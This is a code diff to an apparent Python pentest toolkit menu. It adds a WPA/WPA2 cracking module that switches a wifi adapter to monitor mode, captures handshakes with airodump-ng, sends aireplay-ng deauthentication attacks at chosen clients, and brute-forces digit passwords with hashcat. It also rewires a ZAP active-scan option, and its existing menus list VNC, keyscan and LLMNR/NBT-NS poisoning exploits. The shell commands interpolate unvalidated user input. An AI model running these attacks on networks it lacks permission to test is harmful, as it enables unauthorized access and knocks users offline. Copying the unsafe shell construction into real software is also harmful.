@@ -429,7 +429,7 @@ def vulnscanning_menu():
         #Input Scanning Options
         print("\nPlease Select an Option Below.")
         print("1. OpenVAS")
-        print("2. Nikto")
+        print("2. ZAP Spidering + Active Scan")
         print("3. Port Scanning")
         print("4. Exit")
         menu_input = (input("Select option: "))
@@ -438,9 +438,9 @@ def vulnscanning_menu():
             print(ascii_1)
             openvas_menu()
         elif menu_input == "2":
-            ascii_2 = pyfiglet.figlet_format("Nikto")
+            ascii_2 = pyfiglet.figlet_format("ZAP Spidering + Active Scan")
             print(ascii_2)
-            nikto_menu()
+            zap_scan()
         elif menu_input == "3":
             ascii_3 = pyfiglet.figlet_format("Port Scanning")
             print(ascii_3)
@@ -462,7 +462,8 @@ def exploit_menu():
         print("4. VNC Exploit")
         print("5. Keyscan Exploit")
         print("6. LLMNR / NBT-NS Poisoning")
-        print("7. Exit")
+        print("7. WPA/WPA2 Crack")
+        print("8. Exit")
         menu_input = (input("Select option: "))
         if menu_input == "1":
             ascii_1 = pyfiglet.figlet_format("Packet Sniffer")
@@ -489,6 +490,10 @@ def exploit_menu():
             print(ascii_6)
             llmnr_nbtns_menu()
         elif menu_input == "7":
+            ascii_7 = pyfiglet.figlet_format("WPA/WPA2 Cracking")
+            print(ascii_7)
+            wpa_menu()
+        elif menu_input == "8":
             exploit_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
@@ -617,6 +622,28 @@ def llmnr_nbtns_menu():
             crack_hash_generated()
         elif menu_input == "3":
             llmnr_nbtns_loop = False
+        else:
+            print("Invalid Input!\nPlease Try Again!")
+            continue
+
+def wpa_menu():
+    wpa_loop = True
+    while wpa_loop == True:
+        print("\nPlease Select an Option Below.")
+        print("1. Capture Handshake File")
+        print("2. Crack WPA/WPA2 Password")
+        print("3. Exit")
+        menu_input = input("Select option: ")
+        if menu_input == "1":
+            ascii_1 = pyfiglet.figlet_format("Capture Handshake File")
+            print(ascii_1)
+            capture_handshake()
+        elif menu_input == "2":
+            ascii_2 = pyfiglet.figlet_format("Crack WPA/WPA2 Password")
+            print(ascii_2)
+            crack_password()
+        elif menu_input == "3":
+            wpa_loop = False
         else:
             print("Invalid Input!\nPlease Try Again!")
             continue
@@ -1715,46 +1742,31 @@ def crack_hash_generated():
     start_listener = subprocess.call(['gnome-terminal', '-e', 'bash -c "john Responder/logs/{}; exec bash"'.format(hash_file)])
 
 def zap_scan():
-    zap_command = "/usr/share/zaproxy/zap.sh -config api.key=test"
-    subprocess.Popen(['gnome-terminal','--command',zap_command])
-    print("If a window opens saying 'Do you want to persist the ZAP Session?', please select 'No, I do not want to persist this session at this moment in time' and press start")
-    input("Press enter to continue once ZAP finishes booting up...")
-    time.sleep(5)
-    apikey = 'test'
-    zap = ZAPv2(apikey=apikey)
-    target = input('Enter the URL to attack (eg. http://example/.com): ')    
-    print('Accessing target:', target)
-    zap.urlopen(target)
+    run_zap = "python3 zap.py"
+    subprocess.Popen(['gnome-terminal','-e',run_zap])
 
-    # Spider the target URL
-    print('Spidering target URL...')
-    zap.spider.scan(target)
-
-    # Wait for the spidering to complete
-    while int(zap.spider.status()) < 100:
-        print('Spider progress:', zap.spider.status(), '%')
-        time.sleep(2)
-
-    # Start the active scan
-    print('Starting active scan...')
-    zap.ascan.scan(target)
-
-    # Wait for the active scan to complete
-    while int(zap.ascan.status()) < 100:
-        print('Active scan progress:', zap.ascan.status(), '%')
-        time.sleep(5)
-
-    # Generate the report
-    print('Generating report...')
-    report_html = zap.core.htmlreport()
-    report_xml = zap.core.xmlreport()
-
-    # Save the report to a file
-    with open('report.html', 'w') as f:
-        f.write(report_html)
-
-    with open('report.xml', 'w') as f:
-        f.write(report_xml)
+def capture_handshake():
+    interface = input("Please enter your wifi interface name: (it can be found by using ifconfig) ")
+    adapter_down = "ifconfig {} down".format(interface)
+    subprocess.call(adapter_down,shell=True)
+    monitor_mode = "iwconfig {} mode monitor".format(interface)
+    subprocess.call(monitor_mode,shell=True)
+    adapter_up = "ifconfig {} up".format(interface)
+    subprocess.call(adapter_up,shell=True)
+    subprocess.call('airmon-ng start {}'.format(interface),shell=True)
+    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "airodump-ng {}; exec bash"'.format(interface)])
+    bssid = input("A new terminal will open, please enter the BSSID of the desired network to crack: ")
+    chid = input("Please enter the CH Number of the desired network : ")
+    capture_file = "airodump-ng {} -c {} --bssid {} -w dump".format(interface,chid,bssid)
+    print("Please press Ctrl + C when you see the EAPOL show up")
+    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "airodump-ng {} -c {} --bssid {} -w dump; exec bash"'.format(interface,chid,bssid)])
+    station = input("Enter the station ID to launch a deauth attack to generate more packets: ")
+    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "aireplay-ng -0 {} -a {} -c {} {}; exec bash"'.format(chid,bssid,station,interface)])
+    
+def crack_password():
+    file_name = input("Enter the name desired .cap file (eg. if the .cap file name is dump-01.cap, please enter dump-01) : ")
+    subprocess.call("hcxpcapngtool {}.cap -o {}.txt".format(file_name,file_name),shell=True)
+    subprocess.Popen(['gnome-terminal', '-e', 'bash -c "hashcat -m 22000 -a3 --increment --increment-min 8 --increment-max 10 {}.txt ?d?d?d?d?d?d?d?d; exec bash"'.format(file_name)])
     
 
 project_menu()
